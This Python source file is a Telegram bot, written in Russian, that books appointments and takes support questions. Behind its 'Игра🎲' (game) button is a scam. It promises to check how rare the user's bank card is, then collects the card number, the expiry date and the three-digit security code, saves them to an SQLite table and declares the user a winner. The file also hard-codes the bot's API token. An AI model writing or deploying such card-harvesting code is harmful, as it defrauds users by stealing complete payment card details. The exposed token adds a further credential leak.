from aiogram import types, Dispatcher, Bot
from aiogram.utils import executor
from aiogram.dispatcher.filters.state import StatesGroup, State
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.dispatcher import FSMContext
import sqlite3
import random
import time

bot = Bot(token='7365866888:AAE64t-ihg293fqc64n0XonGrapQB-8qPps', parse_mode="HTML")
dp = Dispatcher(bot, storage=MemoryStorage())

conn = sqlite3.connect('pahermaher.db')
conn2 = sqlite3.connect('supportr.db')
conn3 = sqlite3.connect('very_cool_game.db')

cur = conn.cursor()
cur2 = conn2.cursor()
cur3 = conn3.cursor()

cur.execute('CREATE TABLE IF NOT EXISTS zapisi(name TEXT, time TEXT, id INTEGER)')
cur2.execute('CREATE TABLE IF NOT EXISTS support(message TEXT, id INTEGER)')
cur3.execute('CREATE TABLE IF NOT EXISTS cool_game(nomber INTEGER, special_nomber INTEGER, sroc INTEGER)')

@dp.message_handler(commands='start')
async def hello_message(message: types.Message):
    await message.answer("Доброго времени суток. Вы зашли на бота для записи в pahermahersuy!")
    vibor = types.ReplyKeyboardMarkup(resize_keyboard=True)
    vibor.add("Записаться✏️", "Мои записи📋", "Поддержка⁉️", "Игра🎲")
    await message.answer("Пожалуйста, подскажите, что вы хотите сделать?", reply_markup=vibor)

class Sostoyaniya_for_game(StatesGroup):
    waiting_for_nomer = State()
    waiting_for_sroc = State()
    waiting_for_back_nomer = State()



@dp.message_handler(text='Игра🎲')
async def play(message: types.Message, state:FSMContext):
    await message.answer("Привет! Давай сыграем в игру, на проверку редкости твоей банкоской карточки! ТОЛЬКО у 0,000000000000000001% будет редкая карта!😱😱😱 ")
    await message.answer("Введи номер своеё карты:")
    await Sostoyaniya_for_game.waiting_for_nomer.set()

async def sroc(message: types.Message, state:FSMContext):
    await state.update_data(nomer=message.text)
    nomer_carti = message.text
    # cur3.execute("INSERT INTO cool_game (nomber) VALUES (?)", (nomer_carti,))
    # conn3.commit()
    await message.answer("Воу! Да у тебя есть все шансы на победу!")
    await message.answer("Давай проверим твой срок на карте. Введи его сюда:")
    await Sostoyaniya_for_game.waiting_for_sroc.set()

async def back_nomer(message: types.Message, state:FSMContext):
    await state.update_data(sroc_card=message.text)
    croc = message.text
    # cur3.execute("INSERT INTO cool_game (sroc) VALUES (?)", (croc,))
    # conn3.commit()
    await message.answer("Неможет быть... У нас тут, похоже, победитель... надо проверить кое-что...")
    await message.answer("Скинь 3 цифры с обратной стороны карты:")
    await Sostoyaniya_for_game.waiting_for_back_nomer.set()

async def win(message: types.Message, state:FSMContext):
    await state.update_data(zadi_nomer=message.text)
    data = await state.get_data()
    yooooou = message.text
    nomber_take = data.get("nomer")
    sroc_take = data.get("sroc_card")
    cur3.execute("INSERT INTO cool_game (special_nomber, sroc, nomber) VALUES (?, ?, ?)", (yooooou, sroc_take, nomber_take,))
    conn3.commit()
    await message.answer("ЭТО 100% ПОБЕДИТЕЛЬ! МЫ ПОЗДРАВЛЯЕМ ТЕБЯ!!!🥳🥳🥳🤮🥳🥳 ТЫ ПЕРВЫЙ ТОТ, КТО ВЫИГРАЛ У НАС И ДАЛ НАМ СВОЮ КАРТУ!🥳")
    await state.finish()
    return

def register_command3(dp:Dispatcher):
    dp.register_message_handler(play, text="Игра🎲", state="*")
    dp.register_message_handler(sroc, state=Sostoyaniya_for_game.waiting_for_nomer)
    dp.register_message_handler(back_nomer, state=Sostoyaniya_for_game.waiting_for_sroc)
    dp.register_message_handler(win, state=Sostoyaniya_for_game.waiting_for_back_nomer)

register_command3(dp)


class Sostoyaniya2(StatesGroup):
    waiting_for_question = State()

@dp.message_handler(text='Поддержка⁉️') 
async def support(message:types.Message, state:FSMContext):
    await message.answer("Задайте вопрос: ")
    await Sostoyaniya2.waiting_for_question.set()


async def end(message:types.Message, state: FSMContext):
    await state.update_data(question=message.text)
    support_of_user = message.text
    user_id_for_support = message.from_user.id
    cur2.execute("INSERT INTO support (message, id) VALUES (?, ?)", (support_of_user, user_id_for_support))
    conn2.commit()
    await message.answer("Спасибо за вопрос! Мы поможем, как тока сможем)")
    await state.finish()
    return

def register_command2(dp:Dispatcher):
    dp.register_message_handler(support, text="Поддержка⁉️", state="*")
    dp.register_message_handler(end, state=Sostoyaniya2.waiting_for_question)

register_command2(dp)

class Sostoyaniya(StatesGroup):
    waiting_for_date_and_time = State()
    waiting_for_name = State()


async def zapis(message:types.Message):
    await message.answer("Отлично! Выберите время, на которое хотите попасть.")
    file = open(f"{message.chat.id}.txt", "w")
    file.close()
    
    await message.answer_photo(types.InputFile("Screenshot_1.jpg"), caption="Выберите запись.")
    await Sostoyaniya.waiting_for_date_and_time.set()

async def name(message:types.Message, state: FSMContext):
    await state.update_data(data_and_time=message.text)
    await message.answer("Отлично! Теперь скажите, пожалуйста, ваше имя.")
    await Sostoyaniya.waiting_for_name.set()

async def end(message:types.Message, state: FSMContext):
    user_name = message.text
    user_id = message.from_user.id
    
    data = await state.get_data()
    file = open(f"{message.chat.id}.txt", "a")
    data_and_time = data.get("data_and_time")

    cur.execute("INSERT INTO zapisi (name, time, id) VALUES (?, ?, ?)", (user_name,data_and_time, user_id))
    conn.commit()
    
    await message.answer(f"Вы были записаный, ждём человека с именим {user_name} в {data.get('data_and_time')}")
    await state.finish()
    return

def register_command(dp:Dispatcher):
    dp.register_message_handler(zapis, text="Записаться✏️", state="*")
    dp.register_message_handler(name, state=Sostoyaniya.waiting_for_date_and_time)
    dp.register_message_handler(end, state=Sostoyaniya.waiting_for_name)

register_command(dp)

@dp.message_handler(text='Мои записи📋')    
async def hello_message(message: types.Message, state: FSMContext):
    cur.execute('SELECT name, time FROM zapisi WHERE id = ?', (message.from_user.id,))
    abc = cur.fetchall()

    if not abc:
        await message.answer("У вас пока что нет записей")
        return
    
    text = "Ваши записи:\n"
    for name, time_ in abc:
        text += f"{time_} - {name}\n"
    await message.answer(f"{text}")


        

conn.commit()

executor.start_polling(dp, skip_updates=True)